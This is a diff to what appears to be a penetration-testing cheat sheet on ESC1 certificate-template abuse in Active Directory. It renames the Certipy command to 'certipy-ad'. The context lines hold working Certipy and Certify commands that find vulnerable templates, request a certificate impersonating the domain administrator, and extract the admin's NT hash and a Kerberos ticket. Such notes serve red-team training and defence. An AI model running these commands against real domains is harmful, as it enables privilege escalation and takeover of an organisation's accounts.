@@ -14,7 +14,7 @@ msPKI-Enrollment-Flag            -      0x0                                     
 
 # ESC1 Enumeration
 ```powershell
-certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout
+certipy-ad find -u 'user@domain.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout
 
 Certify.exe find /vulnerable
 Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
@@ -32,7 +32,7 @@ ldapsearch -x -H ldap://dc.domain.local \
 # ESC1 Exploitation with Certipy
 ```powershell
 # Request a certificate on behalf of the Domain Admin
-certipy req \
+certipy-ad req \
   -u 'lowpriv@domain.local' \
   -p 'Password123' \
   -dc-ip 10.10.10.10 \
@@ -41,12 +41,12 @@ certipy req \
   -upn 'administrator@domain.local'
 
 # Get NT Hash from certificate
-certipy auth \
+certipy-ad auth \
   -pfx administrator.pfx \
   -dc-ip 10.10.10.10
 
 # Get TGT from certificate
-certipy auth \
+certipy-ad auth \
   -pfx administrator.pfx \
   -domain domain.local \
   -dc-ip 10.10.10.10
